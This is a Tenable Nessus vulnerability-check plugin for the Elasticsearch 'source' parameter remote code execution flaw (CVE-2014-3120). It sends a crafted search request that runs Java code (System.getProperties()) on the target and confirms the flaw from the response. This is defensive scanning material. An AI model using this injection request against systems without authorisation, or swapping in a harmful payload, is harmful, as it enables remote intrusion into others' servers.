#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76572);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/05/20 13:54:16 $");

  script_cve_id("CVE-2014-3120");
  script_bugtraq_id(67731);
  script_osvdb_id(106949);
  script_xref(name:"EDB-ID", value:"33370");
  script_xref(name:"EDB-ID", value:"33588");

  script_name(english:"Elasticsearch 'source' Parameter RCE");
  script_summary(english:"Attempts to execute arbitrary Java code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a Java application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Elasticsearch application hosted on the remote web server is
affected by a remote code execution vulnerability due to a failure to
properly sanitize user-supplied input to the 'source' parameter of the
'/_search' page. A remote, unauthenticated attacker can exploit this
flaw to execute arbitrary Java code or manipulate files on the remote
host.");

  script_set_attribute(attribute:"see_also", value:"http://bouk.co/blog/elasticsearch-rce/");
  script_set_attribute(attribute:"see_also", value:"https://www.found.no/foundation/elasticsearch-security/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.2.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ElasticSearch Dynamic Script Arbitrary Java Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/05/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:elasticsearch:elasticsearch");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("elasticsearch_detect.nbin");
  script_require_keys("installed_sw/Elasticsearch");
  script_require_ports("Services/www",9200);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "Elasticsearch";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:9200);

install = get_single_install(
  app_name            : app,
  port                : port
);

dir  = install['path'];
url  = build_url(qs:dir, port:port);
vuln = FALSE;

j_int  = rand();
j_int2 = rand();
j_int3 = rand();

attack = '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"' +
  'script_fields":{"Java Properties":{"script":"import java.lang.*;\\n' +
  'System.getProperties();"}}}&callback=jQuery' + j_int + '_' + j_int2 +
  '&_=' + j_int3;

attack = urlencode(
  str        : attack,
  unreserved : 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.&=_*()',
  case_type  : HEX_UPPERCASE
);
attack = dir+"_search?source="+attack;

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : attack,
  exit_on_fail : TRUE
);

vuln = (
  ("jQuery" + j_int + "_" + j_int2)  >< res[2] &&
  "java.specification.version"       >< res[2] &&
  "java.version"                     >< res[2] &&
  '"successful":'                    >< res[2]
);

if (!vuln) 
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

attack = build_url(qs:attack, port:port);
security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  cmd        : "System.getProperties()",
  output     : res[2],
  request    : make_list(attack),
  line_limit : 25
);
